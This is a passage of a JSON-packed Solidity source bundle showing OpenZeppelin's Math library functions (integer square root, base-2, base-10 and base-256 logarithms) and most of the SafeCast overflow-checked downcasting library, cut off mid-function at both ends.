byteArray) private pure returns (bool) {\n        for (uint256 i = 0; i < byteArray.length; ++i) {\n            if (byteArray[i] != 0) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    /**\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded\n     * towards zero.\n     *\n     * This method is based on Newton's method for computing square roots; the algorithm is restricted to only\n     * using integer operations.\n     */\n    function sqrt(uint256 a) internal pure returns (uint256) {\n        unchecked {\n            // Take care of easy edge cases when a == 0 or a == 1\n            if (a <= 1) {\n                return a;\n            }\n\n            // In this function, we use Newton's method to get a root of `f(x) := x² - a`. It involves building a\n            // sequence x_n that converges toward sqrt(a). For each iteration x_n, we also define the error between\n            // the current value as `ε_n = | x_n - sqrt(a) |`.\n            //\n            // For our first estimation, we consider `e` the smallest power of 2 which is bigger than the square root\n            // of the target. (i.e. `2**(e-1) ≤ sqrt(a) < 2**e`). We know that `e ≤ 128` because `(2¹²⁸)² = 2²⁵⁶` is\n            // bigger than any uint256.\n            //\n            // By noticing that\n            // `2**(e-1) ≤ sqrt(a) < 2**e → (2**(e-1))² ≤ a < (2**e)² → 2**(2*e-2) ≤ a < 2**(2*e)`\n            // we can deduce that `e - 1` is `log2(a) / 2`. We can thus compute `x_n = 2**(e-1)` using a method similar\n            // to the msb function.\n            uint256 aa = a;\n            uint256 xn = 1;\n\n            if (aa >= (1 << 128)) {\n                aa >>= 128;\n                xn <<= 64;\n            }\n            if (aa >= (1 << 64)) {\n                aa >>= 64;\n                xn <<= 32;\n            }\n            if (aa >= (1 << 32)) {\n                aa >>= 32;\n                xn <<= 16;\n            }\n            if (aa >= (1 << 16)) {\n                aa >>= 16;\n                xn <<= 8;\n            }\n            if (aa >= (1 << 8)) {\n                aa >>= 8;\n                xn <<= 4;\n            }\n            if (aa >= (1 << 4)) {\n                aa >>= 4;\n                xn <<= 2;\n            }\n            if (aa >= (1 << 2)) {\n                xn <<= 1;\n            }\n\n            // We now have x_n such that `x_n = 2**(e-1) ≤ sqrt(a) < 2**e = 2 * x_n`. This implies ε_n ≤ 2**(e-1).\n            //\n            // We can refine our estimation by noticing that the middle of that interval minimizes the error.\n            // If we move x_n to equal 2**(e-1) + 2**(e-2), then we reduce the error to ε_n ≤ 2**(e-2).\n            // This is going to be our x_0 (and ε_0)\n            xn = (3 * xn) >> 1; // ε_0 := | x_0 - sqrt(a) | ≤ 2**(e-2)\n\n            // From here, Newton's method give us:\n            // x_{n+1} = (x_n + a / x_n) / 2\n            //\n            // One should note that:\n            // x_{n+1}² - a = ((x_n + a / x_n) / 2)² - a\n            //              = ((x_n² + a) / (2 * x_n))² - a\n            //              = (x_n⁴ + 2 * a * x_n² + a²) / (4 * x_n²) - a\n            //              = (x_n⁴ + 2 * a * x_n² + a² - 4 * a * x_n²) / (4 * x_n²)\n            //              = (x_n⁴ - 2 * a * x_n² + a²) / (4 * x_n²)\n            //              = (x_n² - a)² / (2 * x_n)²\n            //              = ((x_n² - a) / (2 * x_n))²\n            //              ≥ 0\n            // Which proves that for all n ≥ 1, sqrt(a) ≤ x_n\n            //\n            // This gives us the proof of quadratic convergence of the sequence:\n            // ε_{n+1} = | x_{n+1} - sqrt(a) |\n            //         = | (x_n + a / x_n) / 2 - sqrt(a) |\n            //         = | (x_n² + a - 2*x_n*sqrt(a)) / (2 * x_n) |\n            //         = | (x_n - sqrt(a))² / (2 * x_n) |\n            //         = | ε_n² / (2 * x_n) |\n            //         = ε_n² / | (2 * x_n) |\n            //\n            // For the first iteration, we have a special case where x_0 is known:\n            // ε_1 = ε_0² / | (2 * x_0) |\n            //     ≤ (2**(e-2))² / (2 * (2**(e-1) + 2**(e-2)))\n            //     ≤ 2**(2*e-4) / (3 * 2**(e-1))\n            //     ≤ 2**(e-3) / 3\n            //     ≤ 2**(e-3-log2(3))\n            //     ≤ 2**(e-4.5)\n            //\n            // For the following iterations, we use the fact that, 2**(e-1) ≤ sqrt(a) ≤ x_n:\n            // ε_{n+1} = ε_n² / | (2 * x_n) |\n            //         ≤ (2**(e-k))² / (2 * 2**(e-1))\n            //         ≤ 2**(2*e-2*k) / 2**e\n            //         ≤ 2**(e-2*k)\n            xn = (xn + a / xn) >> 1; // ε_1 := | x_1 - sqrt(a) | ≤ 2**(e-4.5)  -- special case, see above\n            xn = (xn + a / xn) >> 1; // ε_2 := | x_2 - sqrt(a) | ≤ 2**(e-9)    -- general case with k = 4.5\n            xn = (xn + a / xn) >> 1; // ε_3 := | x_3 - sqrt(a) | ≤ 2**(e-18)   -- general case with k = 9\n            xn = (xn + a / xn) >> 1; // ε_4 := | x_4 - sqrt(a) | ≤ 2**(e-36)   -- general case with k = 18\n            xn = (xn + a / xn) >> 1; // ε_5 := | x_5 - sqrt(a) | ≤ 2**(e-72)   -- general case with k = 36\n            xn = (xn + a / xn) >> 1; // ε_6 := | x_6 - sqrt(a) | ≤ 2**(e-144)  -- general case with k = 72\n\n            // Because e ≤ 128 (as discussed during the first estimation phase), we know have reached a precision\n            // ε_6 ≤ 2**(e-144) < 1. Given we're operating on integers, then we can ensure that xn is now either\n            // sqrt(a) or sqrt(a) + 1.\n            return xn - SafeCast.toUint(xn > a / xn);\n        }\n    }\n\n    /**\n     * @dev Calculates sqrt(a), following the selected rounding direction.\n     */\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\n        unchecked {\n            uint256 result = sqrt(a);\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && result * result < a);\n        }\n    }\n\n    /**\n     * @dev Return the log in base 2 of a positive value rounded towards zero.\n     * Returns 0 if given 0.\n     */\n    function log2(uint256 x) internal pure returns (uint256 r) {\n        // If value has upper 128 bits set, log2 result is at least 128\n        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;\n        // If upper 64 bits of 128-bit half set, add 64 to result\n        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;\n        // If upper 32 bits of 64-bit half set, add 32 to result\n        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;\n        // If upper 16 bits of 32-bit half set, add 16 to result\n        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;\n        // If upper 8 bits of 16-bit half set, add 8 to result\n        r |= SafeCast.toUint((x >> r) > 0xff) << 3;\n        // If upper 4 bits of 8-bit half set, add 4 to result\n        r |= SafeCast.toUint((x >> r) > 0xf) << 2;\n\n        // Shifts value right by the current result and use it as an index into this lookup table:\n        //\n        // | x (4 bits) |  index  | table[index] = MSB position |\n        // |------------|---------|-----------------------------|\n        // |    0000    |    0    |        table[0] = 0         |\n        // |    0001    |    1    |        table[1] = 0         |\n        // |    0010    |    2    |        table[2] = 1         |\n        // |    0011    |    3    |        table[3] = 1         |\n        // |    0100    |    4    |        table[4] = 2         |\n        // |    0101    |    5    |        table[5] = 2         |\n        // |    0110    |    6    |        table[6] = 2         |\n        // |    0111    |    7    |        table[7] = 2         |\n        // |    1000    |    8    |        table[8] = 3         |\n        // |    1001    |    9    |        table[9] = 3         |\n        // |    1010    |   10    |        table[10] = 3        |\n        // |    1011    |   11    |        table[11] = 3        |\n        // |    1100    |   12    |        table[12] = 3        |\n        // |    1101    |   13    |        table[13] = 3        |\n        // |    1110    |   14    |        table[14] = 3        |\n        // |    1111    |   15    |        table[15] = 3        |\n        //\n        // The lookup table is represented as a 32-byte value with the MSB positions for 0-15 in the last 16 bytes.\n        assembly (\"memory-safe\") {\n            r := or(r, byte(shr(r, x), 0x0000010102020202030303030303030300000000000000000000000000000000))\n        }\n    }\n\n    /**\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\n     * Returns 0 if given 0.\n     */\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\n        unchecked {\n            uint256 result = log2(value);\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << result < value);\n        }\n    }\n\n    /**\n     * @dev Return the log in base 10 of a positive value rounded towards zero.\n     * Returns 0 if given 0.\n     */\n    function log10(uint256 value) internal pure returns (uint256) {\n        uint256 result = 0;\n        unchecked {\n            if (value >= 10 ** 64) {\n                value /= 10 ** 64;\n                result += 64;\n            }\n            if (value >= 10 ** 32) {\n                value /= 10 ** 32;\n                result += 32;\n            }\n            if (value >= 10 ** 16) {\n                value /= 10 ** 16;\n                result += 16;\n            }\n            if (value >= 10 ** 8) {\n                value /= 10 ** 8;\n                result += 8;\n            }\n            if (value >= 10 ** 4) {\n                value /= 10 ** 4;\n                result += 4;\n            }\n            if (value >= 10 ** 2) {\n                value /= 10 ** 2;\n                result += 2;\n            }\n            if (value >= 10 ** 1) {\n                result += 1;\n            }\n        }\n        return result;\n    }\n\n    /**\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\n     * Returns 0 if given 0.\n     */\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\n        unchecked {\n            uint256 result = log10(value);\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 10 ** result < value);\n        }\n    }\n\n    /**\n     * @dev Return the log in base 256 of a positive value rounded towards zero.\n     * Returns 0 if given 0.\n     *\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\n     */\n    function log256(uint256 x) internal pure returns (uint256 r) {\n        // If value has upper 128 bits set, log2 result is at least 128\n        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;\n        // If upper 64 bits of 128-bit half set, add 64 to result\n        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;\n        // If upper 32 bits of 64-bit half set, add 32 to result\n        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;\n        // If upper 16 bits of 32-bit half set, add 16 to result\n        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;\n        // Add 1 if upper 8 bits of 16-bit half set, and divide accumulated result by 8\n        return (r >> 3) | SafeCast.toUint((x >> r) > 0xff);\n    }\n\n    /**\n     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.\n     * Returns 0 if given 0.\n     */\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\n        unchecked {\n            uint256 result = log256(value);\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << (result << 3) < value);\n        }\n    }\n\n    /**\n     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.\n     */\n    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {\n        return uint8(rounding) % 2 == 1;\n    }\n}\n"},"@openzeppelin/contracts/utils/math/SafeCast.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SafeCast.sol)\n// This file was procedurally generated from scripts/generate/templates/SafeCast.js.\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Wrappers over Solidity's uintXX/intXX/bool casting operators with added overflow\n * checks.\n *\n * Downcasting from uint256/int256 in Solidity does not revert on overflow. This can\n * easily result in undesired exploitation or bugs, since developers usually\n * assume that overflows raise errors. `SafeCast` restores this intuition by\n * reverting the transaction when such an operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeCast {\n    /**\n     * @dev Value doesn't fit in an uint of `bits` size.\n     */\n    error SafeCastOverflowedUintDowncast(uint8 bits, uint256 value);\n\n    /**\n     * @dev An int value doesn't fit in an uint of `bits` size.\n     */\n    error SafeCastOverflowedIntToUint(int256 value);\n\n    /**\n     * @dev Value doesn't fit in an int of `bits` size.\n     */\n    error SafeCastOverflowedIntDowncast(uint8 bits, int256 value);\n\n    /**\n     * @dev An uint value doesn't fit in an int of `bits` size.\n     */\n    error SafeCastOverflowedUintToInt(uint256 value);\n\n    /**\n     * @dev Returns the downcasted uint248 from uint256, reverting on\n     * overflow (when the input is greater than largest uint248).\n     *\n     * Counterpart to Solidity's `uint248` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 248 bits\n     */\n    function toUint248(uint256 value) internal pure returns (uint248) {\n        if (value > type(uint248).max) {\n            revert SafeCastOverflowedUintDowncast(248, value);\n        }\n        return uint248(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint240 from uint256, reverting on\n     * overflow (when the input is greater than largest uint240).\n     *\n     * Counterpart to Solidity's `uint240` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 240 bits\n     */\n    function toUint240(uint256 value) internal pure returns (uint240) {\n        if (value > type(uint240).max) {\n            revert SafeCastOverflowedUintDowncast(240, value);\n        }\n        return uint240(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint232 from uint256, reverting on\n     * overflow (when the input is greater than largest uint232).\n     *\n     * Counterpart to Solidity's `uint232` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 232 bits\n     */\n    function toUint232(uint256 value) internal pure returns (uint232) {\n        if (value > type(uint232).max) {\n            revert SafeCastOverflowedUintDowncast(232, value);\n        }\n        return uint232(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint224 from uint256, reverting on\n     * overflow (when the input is greater than largest uint224).\n     *\n     * Counterpart to Solidity's `uint224` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 224 bits\n     */\n    function toUint224(uint256 value) internal pure returns (uint224) {\n        if (value > type(uint224).max) {\n            revert SafeCastOverflowedUintDowncast(224, value);\n        }\n        return uint224(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint216 from uint256, reverting on\n     * overflow (when the input is greater than largest uint216).\n     *\n     * Counterpart to Solidity's `uint216` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 216 bits\n     */\n    function toUint216(uint256 value) internal pure returns (uint216) {\n        if (value > type(uint216).max) {\n            revert SafeCastOverflowedUintDowncast(216, value);\n        }\n        return uint216(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint208 from uint256, reverting on\n     * overflow (when the input is greater than largest uint208).\n     *\n     * Counterpart to Solidity's `uint208` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 208 bits\n     */\n    function toUint208(uint256 value) internal pure returns (uint208) {\n        if (value > type(uint208).max) {\n            revert SafeCastOverflowedUintDowncast(208, value);\n        }\n        return uint208(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint200 from uint256, reverting on\n     * overflow (when the input is greater than largest uint200).\n     *\n     * Counterpart to Solidity's `uint200` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 200 bits\n     */\n    function toUint200(uint256 value) internal pure returns (uint200) {\n        if (value > type(uint200).max) {\n            revert SafeCastOverflowedUintDowncast(200, value);\n        }\n        return uint200(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint192 from uint256, reverting on\n     * overflow (when the input is greater than largest uint192).\n     *\n     * Counterpart to Solidity's `uint192` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 192 bits\n     */\n    function toUint192(uint256 value) internal pure returns (uint192) {\n        if (value > type(uint192).max) {\n            revert SafeCastOverflowedUintDowncast(192, value);\n        }\n        return uint192(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint184 from uint256, reverting on\n     * overflow (when the input is greater than largest uint184).\n     *\n     * Counterpart to Solidity's `uint184` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 184 bits\n     */\n    function toUint184(uint256 value) internal pure returns (uint184) {\n        if (value > type(uint184).max) {\n            revert SafeCastOverflowedUintDowncast(184, value);\n        }\n        return uint184(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint176 from uint256, reverting on\n     * overflow (when the input is greater than largest uint176).\n     *\n     * Counterpart to Solidity's `uint176` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 176 bits\n     */\n    function toUint176(uint256 value) internal pure returns (uint176) {\n        if (value > type(uint176).max) {\n            revert SafeCastOverflowedUintDowncast(176, value);\n        }\n        return uint176(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint168 from uint256, reverting on\n     * overflow (when the input is greater than largest uint168).\n     *\n     * Counterpart to Solidity's `uint168` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 168 bits\n     */\n    function toUint168(uint256 value) internal pure returns (uint168) {\n        if (value > type(uint168).max) {\n            revert SafeCastOverflowedUintDowncast(168, value);\n        }\n        return uint168(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint160 from uint256, reverting on\n     * overflow (when the input is greater than largest uint160).\n     *\n     * Counterpart to Solidity's `uint160` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 160 bits\n     */\n    function toUint160(uint256 value) internal pure returns (uint160) {\n        if (value > type(uint160).max) {\n            revert SafeCastOverflowedUintDowncast(160, value);\n        }\n        return uint160(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint152 from uint256, reverting on\n     * overflow (when the input is greater than largest uint152).\n     *\n     * Counterpart to Solidity's `uint152` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 152 bits\n     */\n    function toUint152(uint256 value) internal pure returns (uint152) {\n        if (value > type(uint152).max) {\n            revert SafeCastOverflowedUintDowncast(152, value);\n        }\n        return uint152(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint144 from uint256, reverting on\n     * overflow (when the input is greater than largest uint144).\n     *\n     * Counterpart to Solidity's `uint144` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 144 bits\n     */\n    function toUint144(uint256 value) internal pure returns (uint144) {\n        if (value > type(uint144).max) {\n            revert SafeCastOverflowedUintDowncast(144, value);\n        }\n        return uint144(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint136 from uint256, reverting on\n     * overflow (when the input is greater than largest uint136).\n     *\n     * Counterpart to Solidity's `uint136` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 136 bits\n     */\n    function toUint136(uint256 value) internal pure returns (uint136) {\n        if (value > type(uint136).max) {\n            revert SafeCastOverflowedUintDowncast(136, value);\n        }\n        return uint136(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint128 from uint256, reverting on\n     * overflow (when the input is greater than largest uint128).\n     *\n     * Counterpart to Solidity's `uint128` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 128 bits\n     */\n    function toUint128(uint256 value) internal pure returns (uint128) {\n        if (value > type(uint128).max) {\n            revert SafeCastOverflowedUintDowncast(128, value);\n        }\n        return uint128(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint120 from uint256, reverting on\n     * overflow (when the input is greater than largest uint120).\n     *\n     * Counterpart to Solidity's `uint120` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 120 bits\n     */\n    function toUint120(uint256 value) internal pure returns (uint120) {\n        if (value > type(uint120).max) {\n            revert SafeCastOverflowedUintDowncast(120, value);\n        }\n        return uint120(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint112 from uint256, reverting on\n     * overflow (when the input is greater than largest uint112).\n     *\n     * Counterpart to Solidity's `uint112` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 112 bits\n     */\n    function toUint112(uint256 value) internal pure returns (uint112) {\n        if (value > type(uint112).max) {\n            revert SafeCastOverflowedUintDowncast(112, value);\n        }\n        return uint112(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint104 from uint256, reverting on\n     * overflow (when the input is greater than largest uint104).\n     *\n     * Counterpart to Solidity's `uint104` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 104 bits\n     */\n    function toUint104(uint256 value) internal pure returns (uint104) {\n        if (value > type(uint104).max) {\n            revert SafeCastOverflowedUintDowncast(104, value);\n        }\n        return uint104(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint96 from uint256, reverting on\n     * overflow (when the input is greater than largest uint96).\n     *\n     * Counterpart to Solidity's `uint96` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 96 bits\n     */\n    function toUint96(uint256 value) internal pure returns (uint96) {\n        if (value > type(uint96).max) {\n            revert SafeCastOverflowedUintDowncast(96, value);\n        }\n        return uint96(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint88 from uint256, reverting on\n     * overflow (when the input is greater than largest uint88).\n     *\n     * Counterpart to Solidity's `uint88` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 88 bits\n     */\n    function toUint88(uint256 value) internal pure returns (uint88) {\n        if (value > type(uint88).max) {\n            revert SafeCastOverflowedUintDowncast(88, value);\n        }\n        return uint88(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint80 from uint256, reverting on\n     * overflow (when the input is greater than largest uint80).\n     *\n     * Counterpart to Solidity's `uint80` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 80 bits\n     */\n    function toUint80(uint256 value) internal pure returns (uint80) {\n        if (value > type(uint80).max) {\n            revert SafeCastOverflowedUintDowncast(80, value);\n        }\n        return uint80(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint72 from uint256, reverting on\n     * overflow (when the input is greater than largest uint72).\n     *\n     * Counterpart to Solidity's `uint72` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 72 bits\n     */\n    function toUint72(uint256 value) internal pure returns (uint72) {\n        if (value > type(uint72).max) {\n            revert SafeCastOverflowedUintDowncast(72, value);\n        }\n        return uint72(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint64 from uint256, reverting on\n     * overflow (when the input is greater than largest uint64).\n     *\n     * Counterpart to Solidity's `uint64` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 64 bits\n     */\n    function toUint64(uint256 value) internal pure returns (uint64) {\n        if (value > type(uint64).max) {\n            revert SafeCastOverflowedUintDowncast(64, value);\n        }\n        return uint64(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint56 from uint256, reverting on\n     * overflow (when the input is greater than largest uint56).\n     *\n     * Counterpart to Solidity's `uint56` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 56 bits\n     */\n    function toUint56(uint256 value) internal pure returns (uint56) {\n        if (value > type(uint56).max) {\n            revert SafeCastOverflowedUintDowncast(56, value);\n        }\n        return uint56(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint48 from uint256, reverting on\n     * overflow (when the input is greater than largest uint48).\n     *\n     * Counterpart to Solidity's `uint48` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 48 bits\n     */\n    function toUint48(uint256 value) internal pure returns (uint48) {\n        if (value > type(uint48).max) {\n            revert SafeCastOverflowedUintDowncast(48, value);\n        }\n        return uint48(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint40 from uint256, reverting on\n     * overflow (when the input is greater than largest uint40).\n     *\n     * Counterpart to Solidity's `uint40` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 40 bits\n     */\n    function toUint40(uint256 value) internal pure returns (uint40) {\n        if (value > type(uint40).max) {\n            revert SafeCastOverflowedUintDowncast(40, value);\n        }\n        return uint40(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint32 from uint256, reverting on\n     * overflow (when the input is greater than largest uint32).\n     *\n     * Counterpart to Solidity's `uint32` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 32 bits\n     */\n    function toUint32(uint256 value) internal pure returns (uint32) {\n        if (value > type(uint32).max) {\n            revert SafeCastOverflowedUintDowncast(32, value);\n        }\n        return uint32(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint24 from uint256, reverting on\n     * overflow (when the input is greater than largest uint24).\n     *\n     * Counterpart to Solidity's `uint24` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 24 bits\n     */\n    function toUint24(uint256 value) internal pure returns (uint24) {\n        if (value > type(uint24).max) {\n            revert SafeCastOverflowedUintDowncast(24, value);\n        }\n        return uint24(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint16 from uint256, reverting on\n     * overflow (when the input is greater than largest uint16).\n     *\n     * Counterpart to Solidity's `uint16` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 16 bits\n     */\n    function toUint16(uint256 value) internal pure returns (uint16) {\n        if (value > type(uint16).max) {\n            revert SafeCastOverflowedUintDowncast(16, value);\n        }\n        return uint16(value);\n    }\n\n    /**\n     * @dev Returns the downcasted uint8 from uint256, reverting on\n     * overflow (when the input is greater than largest uint8).\n     *\n     * Counterpart to Solidity's `uint8` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 8 bits\n     */\n    function toUint8(uint256 value) internal pure returns (uint8) {\n        if (value > type(uint8).max) {\n            revert SafeCastOverflowedUintDowncast(8, value);\n        }\n        return uint8(value);\n    }\n\n    /**\n     * @dev Converts a signed int256 into an unsigned uint256.\n     *\n     * Requirements:\n     *\n     * - input must be greater than or equal to 0.\n     */\n    function toUint256(int256 value) internal pure returns (uint256) {\n        if (value < 0) {\n            revert SafeCastOverflowedIntToUint(value);\n        }\n        return uint256(value);\n    }\n\n    /**\n     * @dev Returns the downcasted int248 from int256, reverting on\n     * overflow (when the input is less than smallest int248 or\n     * greater than largest int248).\n     *\n     * Counterpart to Solidity's `int248` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 248 bits\n     */\n    function toInt248(int256 value) internal pure returns (int248 downcasted) {\n        downcasted = int248(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(248, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int240 from int256, reverting on\n     * overflow (when the input is less than smallest int240 or\n     * greater than largest int240).\n     *\n     * Counterpart to Solidity's `int240` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 240 bits\n     */\n    function toInt240(int256 value) internal pure returns (int240 downcasted) {\n        downcasted = int240(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(240, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int232 from int256, reverting on\n     * overflow (when the input is less than smallest int232 or\n     * greater than largest int232).\n     *\n     * Counterpart to Solidity's `int232` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 232 bits\n     */\n    function toInt232(int256 value) internal pure returns (int232 downcasted) {\n        downcasted = int232(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(232, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int224 from int256, reverting on\n     * overflow (when the input is less than smallest int224 or\n     * greater than largest int224).\n     *\n     * Counterpart to Solidity's `int224` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 224 bits\n     */\n    function toInt224(int256 value) internal pure returns (int224 downcasted) {\n        downcasted = int224(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(224, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int216 from int256, reverting on\n     * overflow (when the input is less than smallest int216 or\n     * greater than largest int216).\n     *\n     * Counterpart to Solidity's `int216` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 216 bits\n     */\n    function toInt216(int256 value) internal pure returns (int216 downcasted) {\n        downcasted = int216(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(216, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int208 from int256, reverting on\n     * overflow (when the input is less than smallest int208 or\n     * greater than largest int208).\n     *\n     * Counterpart to Solidity's `int208` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 208 bits\n     */\n    function toInt208(int256 value) internal pure returns (int208 downcasted) {\n        downcasted = int208(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(208, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int200 from int256, reverting on\n     * overflow (when the input is less than smallest int200 or\n     * greater than largest int200).\n     *\n     * Counterpart to Solidity's `int200` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 200 bits\n     */\n    function toInt200(int256 value) internal pure returns (int200 downcasted) {\n        downcasted = int200(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(200, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int192 from int256, reverting on\n     * overflow (when the input is less than smallest int192 or\n     * greater than largest int192).\n     *\n     * Counterpart to Solidity's `int192` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 192 bits\n     */\n    function toInt192(int256 value) internal pure returns (int192 downcasted) {\n        downcasted = int192(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(192, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int184 from int256, reverting on\n     * overflow (when the input is less than smallest int184 or\n     * greater than largest int184).\n     *\n     * Counterpart to Solidity's `int184` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 184 bits\n     */\n    function toInt184(int256 value) internal pure returns (int184 downcasted) {\n        downcasted = int184(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(184, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int176 from int256, reverting on\n     * overflow (when the input is less than smallest int176 or\n     * greater than largest int176).\n     *\n     * Counterpart to Solidity's `int176` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 176 bits\n     */\n    function toInt176(int256 value) internal pure returns (int176 downcasted) {\n        downcasted = int176(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(176, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int168 from int256, reverting on\n     * overflow (when the input is less than smallest int168 or\n     * greater than largest int168).\n     *\n     * Counterpart to Solidity's `int168` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 168 bits\n     */\n    function toInt168(int256 value) internal pure returns (int168 downcasted) {\n        downcasted = int168(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(168, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int160 from int256, reverting on\n     * overflow (when the input is less than smallest int160 or\n     * greater than largest int160).\n     *\n     * Counterpart to Solidity's `int160` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 160 bits\n     */\n    function toInt160(int256 value) internal pure returns (int160 downcasted) {\n        downcasted = int160(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(160, 